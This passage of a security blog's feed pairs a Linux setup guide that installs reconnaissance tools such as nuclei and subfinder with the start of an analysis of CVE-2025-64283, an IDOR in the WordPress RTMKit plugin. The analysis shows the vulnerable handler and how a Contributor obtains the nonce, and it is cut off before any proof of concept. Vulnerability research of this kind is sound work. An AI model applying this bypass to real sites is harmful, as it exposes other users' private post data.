2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install bat&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cấu hình&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias bat=&amp;#34;batcat&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;font&#34;&gt;&lt;span&gt;Font&lt;/span&gt;&#xA;  &lt;a href=&#34;#font&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fonts-firacode fonts-jetbrains-mono&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;some-alias&#34;&gt;&lt;span&gt;Some alias&lt;/span&gt;&#xA;  &lt;a href=&#34;#some-alias&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias ports=&amp;#39;ss -tulnp&amp;#39;&#xA;alias myip=&amp;#39;ip a | grep inet&amp;#39;&#xA;alias serve=&amp;#39;python3 -m http.server&amp;#39;&#xA;alias cls=&amp;#39;clear&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;golang&#34;&gt;&lt;span&gt;Golang&lt;/span&gt;&#xA;  &lt;a href=&#34;#golang&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install golang-go -y&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cấu hình&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;export PATH=&amp;#34;$HOME/go/bin:$PATH&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;some-tool-from-project-discovery&#34;&gt;&lt;span&gt;Some Tool from Project Discovery&lt;/span&gt;&#xA;  &lt;a href=&#34;#some-tool-from-project-discovery&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;nuclei&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;nuclei -update-templates&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;httpx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;subfinder&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;dnsx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;katana&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/katana/cmd/katana@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;assetfinder&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install github.com/tomnomnom/assetfinder@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;chaos-client&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;uncover&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;docker&#34;&gt;&lt;span&gt;Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install -y docker.io&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo systemctl start docker  &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo usermod -aG docker $USER&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo apt install docker-compose -y&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;telegram-desktop&#34;&gt;&lt;span&gt;Telegram Desktop&lt;/span&gt;&#xA;  &lt;a href=&#34;#telegram-desktop&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install telegram-desktop -y&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>CVE-2025-64283 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-24-cve-2025-64283/</link>
      <pubDate>Wed, 24 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-24-cve-2025-64283/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;vượt qua cơ chế xác thực (Authorization Bypass)&lt;/strong&gt; thông qua &lt;strong&gt;khóa do người dùng kiểm soát (User-Controlled Key)&lt;/strong&gt; trong &lt;strong&gt;Rometheme RTMKit (rometheme-for-elementor)&lt;/strong&gt; cho phép &lt;strong&gt;khai thác cơ chế kiểm soát truy cập được cấu hình không đúng (Incorrectly Configured Access Control)&lt;/strong&gt;.&#xA;Lỗ hổng này ảnh hưởng đến &lt;strong&gt;RTMKit&lt;/strong&gt; từ &lt;strong&gt;n/a&lt;/strong&gt; đến &lt;strong&gt;phiên bản ≤ 1.6.7&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-64283&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-64283&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;hhttps://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ARTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;ARTMKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.8&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_get_template_content&amp;#39;, [$this, &amp;#39;get_template_content&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong WordPress, tiền tố &lt;code&gt;wp_ajax_&lt;/code&gt; dùng để xử lý các yêu cầu AJAX gửi đến &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; từ &lt;strong&gt;người dùng đã đăng nhập&lt;/strong&gt;. Khi request có tham số &lt;code&gt;action=get_template_content&lt;/code&gt;, WordPress sẽ gọi hàm &lt;code&gt;get_template_content&lt;/code&gt; tương ứng để xử lý và trả về dữ liệu.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_template_content()&#xA;{&#xA;    if (!isset($_POST[&amp;#39;wpnonce&amp;#39;]) ||  ! check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;wpnonce&amp;#39;)) {&#xA;        wp_send_json_error(&amp;#39;Access Denied&amp;#39;);&#xA;        wp_die();&#xA;    }&#xA;&#xA;    $id = absint($_POST[&amp;#39;template&amp;#39;]);&#xA;&#xA;    $elementorData = get_post_meta($id, &amp;#39;_elementor_data&amp;#39;, true);&#xA;&#xA;    $data = [&amp;#39;content&amp;#39; =&amp;gt; json_decode($elementorData)];&#xA;&#xA;    wp_send_json_success($data);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;get_template_content&lt;/code&gt; xử lý request AJAX và thực hiện các bước sau:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Kiểm tra sự tồn tại của &lt;code&gt;wpnonce&lt;/code&gt; và xác thực nonce bằng &lt;code&gt;check_ajax_referer&lt;/code&gt; để đảm bảo request hợp lệ, chống CSRF.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Mẹo&lt;/p&gt;&lt;p&gt;Khi search với từ khóa &lt;code&gt;rtm_template_nonce&lt;/code&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/create_nonce.png&#34; title=&#34;Cách nonce được tạo&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/create_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Cách nonce được tạo&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/create_nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;239&#34; width=&#34;1197&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Cách nonce được tạo&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;Nonce được tạo bằng &lt;code&gt;wp_create_nonce(&#39;rtm_template_nonce&#39;)&lt;/code&gt; và được &lt;strong&gt;gắn vào biến JavaScript&lt;/strong&gt; &lt;code&gt;rkit_libs&lt;/code&gt; thông qua &lt;code&gt;wp_localize_script&lt;/code&gt; với &lt;strong&gt;key lưu trữ là &lt;code&gt;template_nonce&lt;/code&gt;&lt;/strong&gt;. Phía client sẽ sử dụng giá trị này và gửi lên server trong request AJAX dưới dạng tham số &lt;code&gt;wpnonce&lt;/code&gt; để phục vụ cho bước xác thực.&#xA;Khi filter request bằng BurpSuite với từ khóa &lt;code&gt;rkit_libs&lt;/code&gt; sẽ thấy được giá trị này&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/nonce.png&#34; title=&#34;Nonce value&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce value&lt;/h2&gt;&lt;p&gt;Nonce value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/nonce.png&#39; alt=&#34;Nonce value&#34; height=&#34;328&#34; width=&#34;1537&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Lấy tham số &lt;code&gt;template&lt;/code&gt; từ &lt;code&gt;POST&lt;/code&gt; và ép kiểu số nguyên bằng &lt;code&gt;absint&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Truy xuất dữ liệu &lt;code&gt;_elementor_data&lt;/code&gt; tương ứng với post ID thông qua &lt;code&gt;get_post_meta&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Giải mã dữ liệu JSON và đóng gói vào mảng kết quả.&lt;/li&gt;&#xA;&lt;li&gt;Trả về dữ liệu bằng phản hồi JSON thành công (&lt;code&gt;wp_send_json_success&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Lỗi&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Lỗ hổng xuất hiện khi &lt;code&gt;$id&lt;/code&gt; không được kiểm soát chặt, khiến người dùng &lt;strong&gt;Contributor+&lt;/strong&gt; có thể lấy bất cứ dữ liệu post nào của người dùng khác.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Bản vá v1.6.8&lt;/strong&gt; bổ sung bước kiểm tra quyền người dùng bằng &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;    